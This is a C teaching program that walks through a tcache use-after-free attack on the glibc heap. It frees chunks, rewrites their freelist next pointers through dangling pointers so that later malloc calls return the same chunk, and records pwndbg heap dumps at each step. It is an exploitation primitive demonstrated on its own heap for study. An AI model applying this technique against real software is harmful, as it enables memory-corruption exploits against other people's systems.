#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void littleEndian(unsigned long *adr, unsigned long value) { *adr = value; }

int main() {
  printf("------------------------------------\n");
  printf("-  T-Cache Use-After-Free Attack   -\n");
  printf("------------------------------------\n");
  getchar();

  /*
      pwndbg> att <pid>
      pwndbg> c
  */

  fprintf(stderr, "Allocating 32 bytes on the heap.\n");
  char *a = malloc(32);
  strcpy(a, "AAAAAAAAAAAAAAAA");
  fprintf(stderr, "malloc(32): %p\n", a);
  char adr[8];
  // Create little endian copy of address
  littleEndian((unsigned long *)adr, (unsigned long)a);
  getchar();

  /*
      pwndbg> tcachebins
      tcachebins
      empty

      pwndbg> vis_heap_chunks
      0x555555559aa0:   0x0000000000000000    0x0000000000000000
      0x555555559ab0:   0x0000000000000000    0x0000000000000031
      0x555555559ac0:   0x4141414141414141    0x4141414141414141
      0x555555559ad0:   0x0000000000000000    0x0000000000000000
      0x555555559ae0:   0x0000000000000000    0x0000000000020521  <-- Top chunk
  */

  fprintf(stderr, "Freeing once...\n");
  free(a);
  fprintf(stderr, "T-Cache Free List: [ %p <-- 0x0 ].\n", a);
  getchar();

  /*
      pwndbg> bins
      tcachebins
      0x20 [  1]: 0x555555559ac0 ◂— 0x0

      pwndbg> vis_heap_chunks
      0x555555559aa0    0x0000000000000000    0x0000000000000000
      0x555555559ab0    0x0000000000000000    0x0000000000000031
      0x555555559ac0    0x0000000000000000    0x0000555555559010  <-- tcachebins[0x30][0/1]
      0x555555559ad0    0x0000000000000000    0x0000000000000000
      0x555555559ae0    0x0000000000000000    0x0000000000020521  <-- Top chunk
  */

  fprintf(stderr, "Instead of freeing again, we have a use-after-free...\n");
  fprintf(stderr, "So we modify the free 'next' chunk to point back at itself!...\n");
  // Copy the chunk address into the chunk next pointer
  strncpy(a, (char *)&a, 8);
  fprintf(stderr, "T-Cache Free List: [ %p <-- %p ].\n", a, a);
  getchar();

  /*
      pwndbg> bins
      tcachebins
      0x20 [  1]: 0x555555559ac0 ◂— 0x555555559ac0

      pwndbg> vis_heap_chunks
      0x555555559aa0:   0x0000000000000000    0x0000000000000000
      0x555555559ab0:   0x0000000000000000    0x0000000000000031
      0x555555559ac0:   0x0000555555559ac0    0x0000555555559010  <-- tcachebins[0x30][0/1], tcachebins[0x30][0/1]
      0x555555559ad0:   0x0000000000000000    0x0000000000000000
      0x555555559ae0:   0x0000000000000000    0x0000000000020521  <-- Top chunk

      It now stores a pointer to the next chunk in the chunk itself!
      We created a fake chunk!
  */

  fprintf(stderr, "Allocating a fresh 32 bytes on the heap.\n");
  a = malloc(32);
  fprintf(stderr, "malloc(32): %p\n", a);
  fprintf(stderr, "T-Cache Free List: [ %p <-- ... ].\n", a);
  fprintf(stderr, "This time, we make sure NOT to write anything into the first 8 bytes!\n");
  getchar();

  /*
      pwndbg> tcachebins
      tcachebins
      0x20 [  0]: 0x555555559ac0 ◂— ...

      pwndbg> vis_heap_chunks
      0x555555559aa0:   0x0000000000000000    0x0000000000000000
      0x555555559ab0:   0x0000000000000000    0x0000000000000031
      0x555555559ac0:   0x0000555555559ac0    0x0000000000000000   <-- tcachebins[0x30][0/0], tcachebins[0x30][0/0]
      0x555555559ad0:   0x0000000000000000    0x0000000000000000
      0x555555559ae0:   0x0000000000000000    0x0000000000020521   <-- Top chunk

      0x20 [  0]: 0x555555559ac0 ◂— ...
            ^^^
      While there's a valid chunk in the bin, the # chunks is 0, so it won't be used
  */

  fprintf(stderr, "Allocating another 32 bytes on the heap.\n");
  char *b = malloc(32);
  strcpy(a, "BBBBBBBB");
  fprintf(stderr, "malloc(32): %p\n", b);

  fprintf(
      stderr,
      "Now, interestingly, even though there's a chunk in the bin, because the # of chunks in the bin was 0, it won't be allocated. So these two chunks will be different\n chunk a = %p\n chunk b = %p\n", a, b);
  getchar();

  /*
   *
      pwndbg> tcachebins
      tcachebins
      0x30 [  0]: 0x555555559ac0 ◂— ...

      pwndbg> vis_heap_chunks
      0x555555559aa0:   0x0000000000000000    0x0000000000000000
      0x555555559ab0:   0x0000000000000000    0x0000000000000031
      0x555555559ac0:   0x4242424242424242    0x0000000000000000    <-- tcachebins[0x30][0/0]
      0x555555559ad0:   0x0000000000000000    0x0000000000000000
      0x555555559ae0:   0x0000000000000000    0x0000000000000031
      0x555555559af0:   0x0000000000000000    0x0000000000000000
      0x555555559b00:   0x0000000000000000    0x0000000000000000
      0x555555559b10:   0x0000000000000000    0x00000000000204f1    <-- Top chunk
  */

  fprintf(stderr, "If we allocate, and then free two chunks, now the bin should have 2 chunks in it.\n");
  char *c = malloc(32);
  char *d = malloc(32);
  free(c);
  free(d);
  getchar();

  /*
    pwndbg> bins
    tcachebins
    0x30 [  2]: 0x5988c6d18b50 —▸ 0x5988c6d18b20 —▸ 0x5988c6d18ac0 ◂— ...

    0x5988c6d18ac0:  0x4242424242424242  0x0000000000000000  <-- tcachebins[0x30][2/2]
    0x5988c6d18ad0:  0x0000000000000000  0x0000000000000000
    0x5988c6d18ae0:  0x0000000000000000  0x0000000000000031
    0x5988c6d18af0:  0x0000000000000000  0x0000000000000000
    0x5988c6d18b00:  0x0000000000000000  0x0000000000000000
    0x5988c6d18b10:  0x0000000000000000  0x0000000000000031
    0x5988c6d18b20:  0x00005988c6d18ac0  0x00005988c6d18010  <-- tcachebins[0x30][1/2]
    0x5988c6d18b30:  0x0000000000000000  0x0000000000000000
    0x5988c6d18b40:  0x0000000000000000  0x0000000000000031
    0x5988c6d18b50:  0x00005988c6d18b20  0x00005988c6d18010  <-- tcachebins[0x30][0/2]
    0x5988c6d18b60:  0x0000000000000000  0x0000000000000000
    0x5988c6d18b70:  0x0000000000000000  0x0000000000020491  <-- Top chunk
  */

  fprintf(stderr, "Now we can overwrite the next pointer of the first chunk to point to itself.\n");
  strncpy(d, (char *)&d, 8);
  getchar();

  /*
    pwndbg> bins
    tcachebins
    0x30 [  2]: 0x5988c6d18b50 ◂— 0x5988c6d18b50

    0x5988c6d18ab0:  0x0000000000000000  0x0000000000000031
    0x5988c6d18ac0:  0x4242424242424242  0x0000000000000000
    0x5988c6d18ad0:  0x0000000000000000  0x0000000000000000
    0x5988c6d18ae0:  0x0000000000000000  0x0000000000000031
    0x5988c6d18af0:  0x0000000000000000  0x0000000000000000
    0x5988c6d18b00:  0x0000000000000000  0x0000000000000000
    0x5988c6d18b10:  0x0000000000000000  0x0000000000000031
    0x5988c6d18b20:  0x00005988c6d18ac0  0x00005988c6d18010
    0x5988c6d18b30:  0x0000000000000000  0x0000000000000000
    0x5988c6d18b40:  0x0000000000000000  0x0000000000000031
    0x5988c6d18b50:  0x00005988c6d18b50  0x00005988c6d18010    <-- tcachebins[0x30][0/2], tcachebins[0x30][0/2]
    0x5988c6d18b60:  0x0000000000000000  0x0000000000000000
    0x5988c6d18b70:  0x0000000000000000  0x0000000000020491    <-- Top chunk

    point out that *0x5988c6d18b50 = 0x5988c6d18b50
  */

  c = malloc(32);
  d = malloc(32);
  fprintf(
      stderr,
      "And now both pointers should be to the same chunk\n chunk a = %p\n chunk b = %p\n", c, d);
  getchar();

  return 0;
}